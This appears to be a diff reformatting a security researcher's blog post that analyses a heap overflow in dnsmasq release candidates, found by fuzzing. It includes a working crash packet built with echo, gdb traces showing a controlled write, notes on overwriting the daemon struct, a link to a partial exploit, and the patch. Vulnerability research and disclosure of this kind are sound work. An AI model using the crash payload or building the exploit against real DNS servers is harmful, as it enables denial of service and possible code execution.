+            printf(<span class="Constant">&quot;Returning: [</span><span class="Special">%d</span><span class="Constant">] </span><span class="Special">%s</span><span class="Special">\n</span><span class="Constant">&quot;</span>, ((<span class="Type">uint64_t</span>)cp) - ((<span class="Type">uint64_t</span>)name), name);
             <span class="Statement">return</span> <span class="Constant">0</span>;
           }
 
           p = l + (<span class="Type">unsigned</span> <span class="Type">char</span> *)header;
         }
-```
+</pre>
 
 If look at that code, everything looks pretty okay (and for what it's worth, the printf()s are my instrumentation and aren't in the original). If that's not the problem, the only other field type being parsed is the name part (ie, the part without 0x40/0xc0/etc. in front). Here's the code (with a bunch of stuff removed and the indents re-flowed):
 
-```
-<pre id="vimCodeElement">
+<pre id='vimCodeElement'>
   namelen += l;
-  <span class="Statement">if</span> (namelen+<span class="Constant">1</span> >= MAXDNAME)
+  <span class="Statement">if</span> (namelen+<span class="Constant">1</span> &gt;= MAXDNAME)
   {
-    printf(<span class="Constant">"namelen is too long!</span><span class="Special">\n</span><span class="Constant">"</span>); <span class="Comment">/*</span><span class="Comment"> <-- This is what triggers. </span><span class="Comment">*/</span>
-    printf(<span class="Constant">"Returning: [</span><span class="Special">%d</span><span class="Constant">] </span><span class="Special">%s</span><span class="Special">\n</span><span class="Constant">"</span>, ((<span class="Type">uint64_t</span>)cp) - ((<span class="Type">uint64_t</span>)name), name);
+    printf(<span class="Constant">&quot;namelen is too long!</span><span class="Special">\n</span><span class="Constant">&quot;</span>); <span class="Comment">/*</span><span class="Comment"> &lt;-- This is what triggers. </span><span class="Comment">*/</span>
+    printf(<span class="Constant">&quot;Returning: [</span><span class="Special">%d</span><span class="Constant">] </span><span class="Special">%s</span><span class="Special">\n</span><span class="Constant">&quot;</span>, ((<span class="Type">uint64_t</span>)cp) - ((<span class="Type">uint64_t</span>)name), name);
     <span class="Statement">return</span> <span class="Constant">0</span>;
   }
   <span class="Statement">if</span> (!CHECK_LEN(header, p, plen, l))
   {
-    printf(<span class="Constant">"CHECK_LEN failed!</span><span class="Special">\n</span><span class="Constant">"</span>);
+    printf(<span class="Constant">&quot;CHECK_LEN failed!</span><span class="Special">\n</span><span class="Constant">&quot;</span>);
     <span class="Statement">return</span> <span class="Constant">0</span>;
   }
-  <span class="Statement">for</span>(j=<span class="Constant">0</span>; j<l; j++, p++)
+  <span class="Statement">for</span>(j=<span class="Constant">0</span>; j&lt;l; j++, p++)
   {
     <span class="Type">unsigned</span> <span class="Type">char</span> c = *p;
-    <span class="Statement">if</span> (c != <span class="Constant">0</span> && c != <span class="Constant">'.'</span>)
+    <span class="Statement">if</span> (c != <span class="Constant">0</span> &amp;&amp; c != <span class="Constant">'.'</span>)
       *cp++ = c;
     <span class="Statement">else</span>
       <span class="Statement">return</span> <span class="Constant">0</span>;
   }
   *cp++ = <span class="Constant">'.'</span>;
-```
+</pre>
 
 This code runs for each segment that starts with a value less than 64 ("google" and "com", for example).
 
@@ -455,57 +451,53 @@ At the start, <tt>l</tt> is the length of the segment (so 6 in the case of "goog
 
 Then it reads in <tt>l</tt> bytes, one at a time, and copies them into a buffer - <tt>cp</tt> - which happens to be on the heap. the <tt>namelen</tt> check prevents that from overflowing.
 
-*Then it copies a period into the buffer and doesn't increment namelen*.
+<em>Then it copies a period into the buffer and doesn't increment namelen</em>.
 
 Do you see the problem there? It adds <tt>l</tt> to the total length of the buffer, then it reads in <tt>l + 1</tt> bytes, counting the period. Oops?
 
-It turns out, you can mess around with the length and size of substrings quite a bit to get a lot of control over what's written where, but exploiting it is as simple as doing a lookup for "\\x08AAAAAAAA\\xc0\\x0c":
+It turns out, you can mess around with the length and size of substrings quite a bit to get a lot of control over what's written where, but exploiting it is as simple as doing a lookup for "\x08AAAAAAAA\xc0\x0c":
 
-```
-<pre id="vimCodeElement">
-$ <span class="in">echo -ne '\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08AAAAAAAA\xc0\x0c\x00\x00\x01\x00\x01' > crash.bin</span>
-$ <span class="in">./dnsmasq -d --randomize-port --client-fuzz=./crash.bin</span>
+<pre id='vimCodeElement'>
+$ <span class='in'>echo -ne '\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08AAAAAAAA\xc0\x0c\x00\x00\x01\x00\x01' &gt; crash.bin</span>
+$ <span class='in'>./dnsmasq -d --randomize-port --client-fuzz=./crash.bin</span>
 <span class="Comment">[</span>...<span class="Statement">]</span>
 Segmentation fault
-```
+</pre>
 
-However, there are two termination conditions: it'll only loop a grand total of 255 times, and it stops after <tt>namelen</tt> reaches 1024 (non-period) bytes. So coming up with the best possible balance to overwrite what you want is actually pretty tricky - possibly even requires a bit of calculus (or, if you're an engineer, [a program that can optimize it for you](https://blogdata.skullsecurity.org/dnsmasq-partial-sploit.rb) :) ).
+However, there are two termination conditions: it'll only loop a grand total of 255 times, and it stops after <tt>namelen</tt> reaches 1024 (non-period) bytes. So coming up with the best possible balance to overwrite what you want is actually pretty tricky - possibly even requires a bit of calculus (or, if you're an engineer, <a href='https://blogdata.skullsecurity.org/dnsmasq-partial-sploit.rb'>a program that can optimize it for you</a> :) ). 
 
-I should also mention: the reason the "\\xc0\\x0c" is needed in the first place is that it's impossible to have a name string in that's 1024 bytes - somewhere along the line, it runs afoul of a length check. The "\\xc0\\x0c" method lets us repeat stuff over and over, sort of like decompressing a small string into memory, overflowing the buffer.
+I should also mention: the reason the "\xc0\x0c" is needed in the first place is that it's impossible to have a name string in that's 1024 bytes - somewhere along the line, it runs afoul of a length check. The "\xc0\x0c" method lets us repeat stuff over and over, sort of like decompressing a small string into memory, overflowing the buffer.
 
-## Exploitability
+<h2>Exploitability</h2>
 
 I mentioned earlier that it's a null-pointer deref:
 
-```
-<pre id="vimCodeElement">
-(gdb) <span class="in">x/i $rip</span>
-=> <span class="Constant">0x7ffff73cc600</span> <__strcpy_sse2+<span class="Constant">192</span>>:  mov    BYTE PTR [rdx],al
-(gdb) <span class="in">print/x $rdx</span>
+<pre id='vimCodeElement'>
+(gdb) <span class='in'>x/i $rip</span>
+=&gt; <span class="Constant">0x7ffff73cc600</span> &lt;__strcpy_sse2+<span class="Constant">192</span>&gt;:  mov    BYTE PTR [rdx],al
+(gdb) <span class='in'>print/x $rdx</span>
 $1 = <span class="Constant">0x0</span>
-```
+</pre>
 
-Let's try again with the crash.bin file we just created, using "\\x08AAAAAAAA\\xc0\\x0c" as the payload:
+Let's try again with the crash.bin file we just created, using "\x08AAAAAAAA\xc0\x0c" as the payload:
 
-```
-<pre id="vimCodeElement">
-$ <span class="in">echo -ne '\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08AAAAAAAA\xc0\x0c\x00\x00\x01\x00\x01' > crash.bin</span>
-$ <span class="in">gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./crash.bin</span>
+<pre id='vimCodeElement'>
+$ <span class='in'>echo -ne '\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08AAAAAAAA\xc0\x0c\x00\x00\x01\x00\x01' &gt; crash.bin</span>
+$ <span class='in'>gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./crash.bin</span>
 [...]
 (gdb) run
 [...]
-(gdb) <span class="in">x/i $rip</span>
-=> <span class="Constant">0x449998</span> <answer_request+<span class="Constant">1064</span>>:      mov    DWORD PTR [rdx+<span class="Constant">0x20</span>],<span class="Constant">0x0</span>
-(gdb) <span class="in">print/x $rdx</span>
+(gdb) <span class='in'>x/i $rip</span>
+=&gt; <span class="Constant">0x449998</span> &lt;answer_request+<span class="Constant">1064</span>&gt;:      mov    DWORD PTR [rdx+<span class="Constant">0x20</span>],<span class="Constant">0x0</span>
+(gdb) <span class='in'>print/x $rdx</span>
 $1 = <span class="Constant">0x4141412e41414141</span>
-```
+</pre>
 
 Woah.. that's not a null-pointer dereference! That's a write-NUL-byte-to-arbitrary-memory! Those might be exploitable!
 
 As I mentioned earlier, this is actually a heap overflow. The interesting part is, the heap memory is allocated once - immediately after the program starts - and right after, a heap for the global settings object (<tt>daemon</tt>) is allocated. That means that we have effectively full control of this object, at least the first couple hundred bytes:
 
-```
-<pre id="vimCodeElement">
+<pre id='vimCodeElement'>
 <span class="Type">extern</span> <span class="Type">struct</span> daemon {
   <span class="Comment">/*</span><span class="Comment"> datastuctures representing the command-line and.</span>
 <span class="Comment">     config file arguments. All set (including defaults)</span>
@@ -601,8 +593,8 @@ As I mentioned earlier, this is actually a heap overflow. The interesting part i
   <span class="Type">time_t</span> forwardtime;
   <span class="Type">int</span> forwardcount;
   <span class="Type">struct</span> server *srv_save; <span class="Comment">/*</span><span class="Comment"> Used for resend on DoD </span><span class="Comment">*/</span>
-  <span class="Type">size_t</span> packet_len;       <span class="Comment">/*</span><span class="Comment">      "        "        </span><span class="Comment">*/</span>
-  <span class="Type">struct</span> randfd *rfd_save; <span class="Comment">/*</span><span class="Comment">      "        "        </span><span class="Comment">*/</span>
+  <span class="Type">size_t</span> packet_len;       <span class="Comment">/*</span><span class="Comment">      &quot;        &quot;        </span><span class="Comment">*/</span>
+  <span class="Type">struct</span> randfd *rfd_save; <span class="Comment">/*</span><span class="Comment">      &quot;        &quot;        </span><span class="Comment">*/</span>
   pid_t tcp_pids[MAX_PROCS];
   <span class="Type">struct</span> randfd randomsocks[RANDOM_SOCKS];
   <span class="Type">int</span> v6pktinfo;.
@@ -645,41 +637,43 @@ As I mentioned earlier, this is actually a heap overflow. The interesting part i
   <span class="Type">char</span> *addrbuff;
   <span class="Type">char</span> *addrbuff2; <span class="Comment">/*</span><span class="Comment"> only allocated when OPT_EXTRALOG </span><span class="Comment">*/</span>
 } *daemon;
-```
+</pre>
 
 I haven't measured how far into that structure you can write, but the total number of bytes we can write into the 1024-byte buffer is 1368 bytes, so somewhere in the realm of the first 300 bytes are at risk.
 
 The reason we saw a "null pointer dereference" and also a "write NUL byte to arbitrary memory" are both because we overwrote variables from that structure that are used later.
 
-## Patch
+<h2>Patch</h2>
 
 The patch is pretty straight forward: add 1 to <tt>namelen</tt> for the periods. There was a second version of the same vulnerability (forgotten period) in the 0x40 handler as well.
 
 But..... I'm concerned about the whole idea of building a string and tracking the length next to it. That's a dangerous design pattern, and the chances of regressing when modifying any of the name parsing is high.
 
-## Exploit so-far
+<h2>Exploit so-far</h2>
 
 I started writing an exploit for it. Before I stopped, I basically found a way to brute-force build a string that would overwrite an arbitrary number of bytes by adding the right amount of padding and the right number of periods. That turned out to be a fairly difficult job, because there are various things you have to juggle (the padding at the front of the string and the size of the repeated field). It turns out, the maximum length you can get is 1368 bytes put into a 1024-byte buffer.
 
-You can download it [here](https://blogdata.skullsecurity.org/dnsmasq-partial-sploit.rb).
+You can download it <a href='https://blogdata.skullsecurity.org/dnsmasq-partial-sploit.rb'>here</a>.
 
-## ...why it never got famous
+<h2>...why it never got famous</h2>
 
 I held this back throughout the blog because it's the sad part. :)
 
-It turns out, since I was working from the git HEAD version, it was brand new code. After bissecting versions to figure out where the vulnerable code came from, I determined that it was present only in 2.73rc5 - 2.73rc7. After I reported it, the [author rolled out 2.73rc8](http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2015q2/009529.html) with the fix.
+It turns out, since I was working from the git HEAD version, it was brand new code. After bissecting versions to figure out where the vulnerable code came from, I determined that it was present only in 2.73rc5 - 2.73rc7. After I reported it, the <a href='http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2015q2/009529.html'>author rolled out 2.73rc8</a> with the fix.
 
 It was disappointing, to say the least, but on the plus side the process was interesting enough to write about! :)
 
-## Conclusion
+<h2>Conclusion</h2>
 
 So to summarize everything...
 
-- I modified dnsmasq to read packets from a file instead of the network, then used afl-fuzz to fuzz and crash it.
-- I found a vulnerability that was recently introduced, when parsing "\\xc0\\x0c" names + using periods.
-- I triaged the vulnerability, and started writing an exploit.
-- Determined that the vulnerability was in brand new code, so I gave up on the exploit and decided to write a blog instead.
+<ul>
+  <li>I modified dnsmasq to read packets from a file instead of the network, then used afl-fuzz to fuzz and crash it.</li>
+  <li>I found a vulnerability that was recently introduced, when parsing "\xc0\x0c" names + using periods.</li>
+  <li>I triaged the vulnerability, and started writing an exploit.</li>
+  <li>Determined that the vulnerability was in brand new code, so I gave up on the exploit and decided to write a blog instead.</li>
+</ul>
 
-And who knows, maybe somebody will develop one for fun? If anybody does, I'll give them *a month of Reddit Gold*!!!! :)
+And who knows, maybe somebody will develop one for fun? If anybody does, I'll give them <em>a month of Reddit Gold</em>!!!! :)
 
 (I'm kidding about using that as a motivator, but I'll really do it if anybody bothers :P)
